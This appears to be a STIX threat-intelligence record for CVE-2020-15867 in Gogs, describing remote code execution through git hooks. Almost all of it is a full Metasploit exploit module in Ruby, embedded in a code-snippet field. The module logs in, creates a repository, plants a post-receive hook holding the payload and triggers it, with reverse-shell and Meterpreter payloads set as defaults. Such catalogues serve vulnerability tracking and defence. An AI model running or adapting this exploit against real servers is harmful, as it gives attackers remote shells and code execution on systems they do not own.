{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cfec8e87-5208-40d8-941f-9705779ece58",
    "created": "2024-08-14T17:10:48.978459Z",
    "modified": "2024-08-14T17:10:48.978463Z",
    "name": "Gogs Git Hooks Remote Code Execution",
    "description": " This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gogs. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator.  To achieve code execution, the module authenticates to the Gogs web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface.  No mitigation has been implemented so far (latest stable version is 0.12.3).  This module has been tested successfully against version 0.12.3 on docker. Windows version could not be tested since the git hook feature seems to be broken. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gogs_git_hooks_rce.rb",
            "external_id": "gogs_git_hooks_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-15867"
        },
        {
            "source_name": "reference",
            "url": "https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gogs Git Hooks Remote Code Execution',\n        'Description' => %q{\n          This module leverages an insecure setting to get remote code\n          execution on the target OS in the context of the user running Gogs.\n          This is possible when the current user is allowed to create `git\n          hooks`, which is the default for administrative users. For\n          non-administrative users, the permission needs to be specifically\n          granted by an administrator.\n\n          To achieve code execution, the module authenticates to the Gogs web\n          interface, creates a temporary repository, sets a `post-receive` git\n          hook with the payload and creates a dummy file in the repository.\n          This last action will trigger the git hook and execute the payload.\n          Everything is done through the web interface.\n\n          No mitigation has been implemented so far (latest stable version is\n          0.12.3).\n\n          This module has been tested successfully against version 0.12.3 on\n          docker. Windows version could not be tested since the git hook feature\n          seems to be broken.\n        },\n        'Author' => [\n          'Podalirius',             # Original PoC\n          'Christophe De La Fuente' # MSF Module\n        ],\n        'References' => [\n          ['CVE', '2020-15867'],\n          ['EDB', '49571'],\n          ['URL', 'https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/'],\n          ['URL', 'https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/']\n        ],\n        'DisclosureDate' => '2020-10-07',\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix linux win],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultOptions' => { 'WfsDelay' => 30 },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(3000),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with']),\n      OptString.new('PASSWORD', [true, 'Password to use']),\n    ])\n\n    @need_cleanup = false\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    )\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    # <meta name=\"author\" content=\"Gogs\" />\n    unless res.body.match(%r{<meta +name=\"author\" +content=\"Gogs\" */>})\n      return CheckCode::Unsupported('Target does not appear to be running Gogs.')\n    end\n\n    CheckCode::Appears('Gogs found')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    print_status(\"Authenticate with \\\"#{datastore['USERNAME']}/#{datastore['PASSWORD']}\\\"\")\n    gogs_login\n    print_good('Logged in')\n\n    @repo_name = [Faker::App.name, Faker::App.name].join('_').gsub(' ', '_')\n    print_status(\"Create repository \\\"#{@repo_name}\\\"\")\n    gogs_create_repo\n    @need_cleanup = true\n    print_good('Repository created')\n\n    case target['Type']\n    when :unix_cmd, :win_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper, :win_dropper\n      execute_cmdstager(background: true, delay: 1)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    print_status('Setup post-receive hook with command')\n    gogs_post_receive_hook(cmd)\n    print_good('Git hook setup')\n\n    print_status('Create a dummy file on the repo to trigger the payload')\n    last_chunk = cmd_list ? cmd == cmd_list.last : true\n    gogs_create_file(last_chunk: last_chunk)\n    print_good(\"File created#{', shell incoming...' if last_chunk}\")\n  end\n\n  def http_post_request(uri, opts = {})\n    csrf = opts.delete(:csrf) || get_csrf(uri)\n    timeout = opts.delete(:timeout) || 20\n\n    post_data = { _csrf: csrf }.merge(opts)\n    request_hash = {\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], uri),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => post_data\n    }\n\n    send_request_cgi(request_hash, timeout)\n  end\n\n  def get_csrf(uri)\n    vprint_status('Get \"csrf\" value')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(uri),\n      'keep_cookies' => true\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to get the CSRF token')\n    end\n\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    csrf\n  end\n\n  def extract_value(res, attr)\n    # <input type=\"hidden\" name=\"_csrf\" value=\"Ix7E3_U_lOt-kZfeMjEll57hZuU6MTYxNzAyMzQwOTEzMjU1MDUwMA\">\n    # <input type=\"hidden\" id=\"user_id\" name=\"user_id\" value=\"1\" required>\n    # <input type=\"hidden\" name=\"last_commit\" value=\"6a7eb84e9a8e4e76a93ea3aec67b2f70fe2518d2\">\n    unless (match = res.body.match(/<input .*name=\"#{attr}\" +value=\"(?<value>[^\"]+)\".*>/))\n      return fail_with(Failure::NotFound, \"\\\"#{attr}\\\" not found in response\")\n    end\n\n    return match[:value]\n  end\n\n  def gogs_login\n    res = http_post_request(\n      '/user/login',\n      user_name: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to reach the login page')\n    end\n\n    unless res.code == 302\n      fail_with(Failure::NoAccess, 'Login failed')\n    end\n\n    nil\n  end\n\n  def gogs_create_repo\n    uri = normalize_uri(datastore['TARGETURI'], '/repo/create')\n\n    res = send_request_cgi('method' => 'GET', 'uri' => uri, 'keep_cookies' => true)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    vprint_status('Get \"csrf\" and \"user_id\" values')\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    user_id = extract_value(res, 'user_id')\n    vprint_good(\"user_id=#{user_id}\")\n\n    res = http_post_request(\n      uri,\n      user_id: user_id,\n      repo_name: @repo_name,\n      private: 'on',\n      description: '',\n      gitignores: '',\n      license: '',\n      readme: 'Default',\n      auto_init: 'on',\n      csrf: csrf\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    unless res.code == 302\n      fail_with(Failure::UnexpectedReply, 'Create repository failure')\n    end\n\n    nil\n  end\n\n  def gogs_post_receive_hook(cmd)\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings/hooks/git/post-receive')\n    shell = <<~SHELL\n      #!/bin/bash\n      #{cmd}&\n      exit 0\n    SHELL\n\n    res = http_post_request(uri, content: shell)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    unless res.code == 302\n      msg = 'Post-receive hook creation failure'\n      if res.code == 404\n        msg << ' (user is probably not allowed to create Git Hooks)'\n      end\n      fail_with(Failure::UnexpectedReply, msg)\n    end\n\n    nil\n  end\n\n  def gogs_create_file(last_chunk: false)\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/_new/master')\n    filename = \"#{Rex::Text.rand_text_alpha(4..8)}.txt\"\n\n    res = send_request_cgi('method' => 'GET', 'uri' => uri, 'keep_cookies' => true)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    vprint_status('Get \"csrf\" and \"last_commit\" values')\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    last_commit = extract_value(res, 'last_commit')\n    vprint_good(\"last_commit=#{last_commit}\")\n\n    http_post_request(\n      uri,\n      last_commit: last_commit,\n      tree_path: filename,\n      content: Rex::Text.rand_text_alpha(1..20),\n      commit_summary: '',\n      commit_message: '',\n      commit_choice: 'direct',\n      csrf: csrf,\n      timeout: last_chunk ? 0 : 20 # The last one never returns, don't bother waiting\n    )\n    vprint_status(\"#{filename} created\")\n\n    nil\n  end\n\n  def cleanup\n    super\n    return unless @need_cleanup\n\n    print_status('Cleaning up')\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings')\n    res = http_post_request(uri, action: 'delete', repo_name: @repo_name)\n\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to reach the settings page')\n    end\n\n    unless res.code == 302\n      fail_with(Failure::UnexpectedReply, 'Delete repository failure')\n    end\n\n    print_status(\"Repository #{@repo_name} deleted.\")\n\n    nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-07",
    "x_mitre_platforms": [
        "win'"
    ]
}